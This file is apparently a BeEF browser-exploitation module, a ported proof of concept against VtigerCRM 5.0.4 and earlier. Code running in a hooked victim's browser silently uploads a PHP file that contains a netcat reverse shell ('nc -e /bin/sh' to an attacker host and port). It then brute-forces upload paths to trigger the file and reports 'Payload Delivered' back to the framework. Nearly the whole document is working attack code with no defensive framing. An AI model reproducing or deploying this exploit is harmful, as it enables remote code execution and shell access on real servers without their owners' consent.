// VtigerCRM <= 5.0.4 "chained exploitation" PoC 
// Hacked up for OWASP New Zealand Day, July 13th 2009
//
// Thanks for the BeEF Wade :) 

// Ported to Ruby BeEF by xntrik 2010

beef.execute(function() {

	//Doing the same trick I used in detect_tor to ensure exploit runs once
	// xntrik

	if (document.getElementById('vtigerimg')) {
		return "Exploit running already";
	}

	var img = new Image();
	img.setAttribute("style","visibility:hidden");
	img.setAttribute("width","0");
	img.setAttribute("height","0");
	img.id = 'vtigerimg';
	
	document.body.appendChild(img);

	baseurl = "<%= @vtiger_url %>";

	function do_upload(){ 
		// start AJAX file upload in 1 second
		//window.setTimeout("ajax_upload()", <%= @timeout %>);
		//alert("one");
		setTimeout(function() {ajax_upload()}, <%= @timeout %>);
	}

	// In a nutshell: 
	// 
	// 1) build url 
	// 2) construct the request object
	// 3) POST the form 
	// 4) once requestdone, call do_callfile()

	function ajax_upload(){ 
		//alert("two");
		// Setup the AJAX POST  
		var targeturl = baseurl + '/index.php?module=uploads&action=add2db&return_module=Home&return_action=index';
		//var binary;
		//var filename;
		//var mytext;

		http_request = false;
		//http_request = new XMLHttpRequest();
		http_request = beef.net.get_ajax();
		if (!http_request) {
			// fail silently!
			return false;
		}

		//prepare the POST 
		var boundaryString = 'PWNED';
		var boundary = '-----------------------------PWNED';
		var requestbody =
		boundary + '\\n'
		+ 'Content-Disposition: form-data; name="MAX_FILE_SIZE"' + '\\n' 
		+ '\\n' 
		+ 3000000 + '\\n'
		+ boundary
		+ '\\n'
		+ 'Content-Disposition: form-data; name="return_module"' + '\\n' 
		+ '\\n'
		+ '\\n'
		+ boundary
		+ '\\n'
		+ 'Content-Disposition: form-data; name="return_action"' + '\\n' 
		+ '\\n'
		+ '\\n'
		+ boundary
		+ '\\n'
		+ 'Content-Disposition: form-data; name="return_id"' + '\\n' 
		+ '\\n'
		+ '\\n' 
		+ boundary
		+ '\\n'
		+ 'Content-Disposition: form-data; name="uploadsubject"' + '\\n' 
		+ '\\n' 
		+ '\\n' 
		+ boundary
		+ '\\n'
		+ 'Content-Disposition: form-data; name="filename"; filename="vtiger-fun.PHP"' + '\\n' 
		+ 'Content-Type: application/x-httpd-php' + '\\n' 
		+ '\\n'
		+ '<\?php' + '\\n' 
		+ 'passthru("/bin/nc -e /bin/sh <%= @vtiger_host %> <%= @vtiger_port %>");' + '\\n'
		+ '\?>' + '\\n'
		+ '\\n'
		+ boundary
		+ '\\n'                                   
		+ 'Content-Disposition: form-data; name="filename_hidden"' + '\\n'
		+ '\\n' 
		+ 'vtiger-fun.PHP'
		+ '\\n'
		+ boundary
		+ '\\n'
		+ 'Content-Disposition: form-data; name="txtDescription"' + '\\\n' 
		+ '\\n' 
		+ 'drop it like its hot' + '\\n' 
		+ boundary 
		+ '\\n'
		+ 'Content-Disposition: form-data; name="save"' + '\\n' 
		+ '\\n' 
		+ 'Attach' + '\\n' 
		+ boundary;

		http_request.onreadystatechange = function() {
			if (http_request.readyState == 4) {
				//window.console.log("ready state go for upload: "+http_request.status);
				if (http_request.status == 200) {
					//window.console.log("Upload worked");
					result = http_request.responseText;
					do_callfile();
				} else {
					//fail silently
				}
			}
			return;
		}
		http_request.open("POST", targeturl, true);
		http_request.setRequestHeader("Content-type", "multipart/form-data; boundary=---------------------------PWNED");
		http_request.setRequestHeader("Content-length", requestbody.length);
		http_request.send(requestbody);

		//beef.net.raw_request(targeturl,'POST',requestdonenew(),requestbody);
		return;
	}

	function requestfile() {
		if (http_request.readyState == 4) {
			if (http_request.status == 200) {
				result = http_request.responseText;
				alert(result);
			} else {
			    // fail silently
				
			}
		}
		return;
	}
	// find our file :)
	//
	// Dirty brute force 
	function do_callfile(){
		var i=0;
		for (i=0;i<=1000;i++)
		{
			 http_request = false;
			 http_request = beef.net.get_ajax();
			 if (!http_request) {
				 // fail silently!
				return false;
			}

			var findurl = baseurl + "<%= @vtiger_filepath %>" + i + "_vtiger-fun.PHP";
			var requestbody = "birds of a feather flock together";
			
			http_request.onreadystatechange = requestfile;
			http_request.open('POST', findurl, true);
			http_request.setRequestHeader("Content-length", requestbody.length);
			http_request.send(requestbody);

		}
		//At this point we can remove the img tag, in the command is going anywhere else now - xntrik
		document.body.removeChild(vtigerimg);
		return;
	}

	// Add your clean up routine here.
	function do_cleanup() {
	    //document.write("Maybe your security team should check out owasp.org? ;)");
		return;
	}

	// Try the upload 
	function do_main(){
		do_upload();
		return;
	}

	// Run the sploit
	do_main();

	//do_cleanup();

	//The JS is loaded, send the sendback to the framework so it shouldn't run any anymore
	// The img id "vtigerimg" is used to also ensure that framework isn't executed multiple times
	// xntrik
	beef.net.sendback('<%= @command_url %>', <%= @command_id %>, 'result=Payload Delivered');
});
